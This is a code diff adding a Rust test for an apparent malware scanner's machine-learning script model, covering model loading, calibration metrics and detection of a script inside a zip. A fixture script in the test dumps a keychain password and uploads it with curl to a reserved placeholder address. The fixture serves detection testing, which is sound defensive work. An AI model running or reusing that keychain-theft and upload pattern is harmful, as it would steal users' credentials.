@@ -597,6 +597,115 @@ fn ml_flags_suspicious_only() {
 }
 
 #[test]
+fn ml_script_model_flags_scripts_suspicious_only() {
+    let f = fixture();
+    // Without any model in the bundle: nothing ML-related happens, models are listed as absent.
+    install_bundle(&f.paths, &[], &[], |_| {});
+    let e = Engine::load(&f.paths, &Config::default()).unwrap();
+    let infos = e.stats().models;
+    assert_eq!(
+        infos.iter().map(|m| m.name.as_str()).collect::<Vec<_>>(),
+        ["macho", "script"]
+    );
+    assert!(infos.iter().all(|m| !m.loaded && m.error.is_none()));
+    // TEST STRING (benign but suspicious-looking): keychain dump shape, reserved address.
+    let bad = b"#!/bin/sh\n# TEST FIXTURE\nsecurity find-generic-password -ga test > /tmp/.t\ncurl -F f=@/tmp/.t http://192.0.2.1/u\n";
+    std::fs::write(f.data.join("bad.sh"), bad).unwrap();
+    std::fs::write(f.data.join("good.sh"), b"#!/bin/sh\necho hello\n").unwrap();
+    assert_eq!(
+        e.scan_file(&f.data.join("bad.sh"), &opts()).verdict,
+        Verdict::Clean
+    );
+
+    let f = fixture();
+    install_bundle(&f.paths, &[], &[], |b| {
+        std::fs::create_dir_all(b.join("ml")).unwrap();
+        std::fs::write(
+            b.join(pb_ml::SCRIPT_MODEL_FILE),
+            pb_ml::test_model_json_for(
+                pb_ml::script_feature_names(),
+                "ind_keychain",
+                0.5,
+                -3.0,
+                3.0,
+            ),
+        )
+        .unwrap();
+        std::fs::write(
+            b.join(pb_ml::SCRIPT_MODEL_META_FILE),
+            format!(
+                r#"{{"features_version":{},"threshold":0.9,"version":"script-test-1","metrics":{{"pr_auc":0.93,"roc_auc":0.99,"trained_at":1792929600}},"calibration":{{"method":"platt","a":1.0,"b":-1.0}}}}"#,
+                pb_ml::SCRIPT_FEATURES_VERSION
+            ),
+        )
+        .unwrap();
+        // A Mach-O model trained on another feature layout: reported, not loaded, not fatal.
+        std::fs::write(
+            b.join(pb_ml::MODEL_FILE),
+            pb_ml::test_model_json("str_osascript", 0.5, -3.0, 3.0),
+        )
+        .unwrap();
+        std::fs::write(
+            b.join(pb_ml::MODEL_META_FILE),
+            r#"{"features_version":1,"threshold":0.9,"version":"old"}"#,
+        )
+        .unwrap();
+    });
+    let e = Engine::load(&f.paths, &Config::default()).unwrap();
+    let stats = e.stats();
+    assert_eq!(stats.ml_model_version, None);
+    let macho = &stats.models[0];
+    assert!(!macho.loaded && macho.error.as_deref().unwrap().contains("incompatible"));
+    let script = &stats.models[1];
+    assert!(script.loaded, "{script:?}");
+    assert_eq!(script.version.as_deref(), Some("script-test-1"));
+    assert_eq!(script.calibration.as_deref(), Some("platt"));
+    assert_eq!(script.trained_at, Some(1_792_929_600));
+    assert_eq!(script.metrics.pr_auc, Some(0.93));
+    assert_eq!(script.trees, Some(1));
+    assert!((script.threshold.unwrap() - 0.9).abs() < 1e-6);
+
+    std::fs::write(f.data.join("bad.sh"), bad).unwrap();
+    std::fs::write(f.data.join("good.sh"), b"#!/bin/sh\necho hello\n").unwrap();
+    let r = e.scan_file(&f.data.join("bad.sh"), &opts());
+    assert_eq!(r.kind, FileKind::Script);
+    assert_eq!(r.verdict, Verdict::Suspicious, "{r:?}");
+    let d = r
+        .detections
+        .iter()
+        .find(|d| d.engine == DetectionEngine::Ml)
+        .unwrap();
+    assert_eq!(d.name, "ML.Script.Suspicious");
+    // Calibrated confidence: sigmoid(1 * 3 - 1).
+    assert!((f64::from(d.confidence) - 1.0 / (1.0 + (-2.0f64).exp())).abs() < 1e-5);
+    assert!(!crate::scoring::is_signature_grade(d, false));
+    assert_eq!(
+        e.scan_file(&f.data.join("good.sh"), &opts()).verdict,
+        Verdict::Clean
+    );
+    let mut o = opts();
+    o.use_ml = false;
+    assert_eq!(
+        e.scan_file(&f.data.join("bad.sh"), &o).verdict,
+        Verdict::Clean
+    );
+    // Scripts inside a zip are scored too (member verdict rolls up to the container).
+    let mut zip = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
+    zip.start_file(
+        "payload/install.sh",
+        zip::write::SimpleFileOptions::default(),
+    )
+    .unwrap();
+    std::io::Write::write_all(&mut zip, bad).unwrap();
+    let zbytes = zip.finish().unwrap().into_inner();
+    std::fs::write(f.data.join("bundle.zip"), zbytes).unwrap();
+    assert_eq!(
+        e.scan_file(&f.data.join("bundle.zip"), &opts()).verdict,
+        Verdict::Suspicious
+    );
+}
+
+#[test]
 fn realtime_latency_10mb() {
     let f = fixture();
     let e = Engine::load(&f.paths, &Config::default()).unwrap();
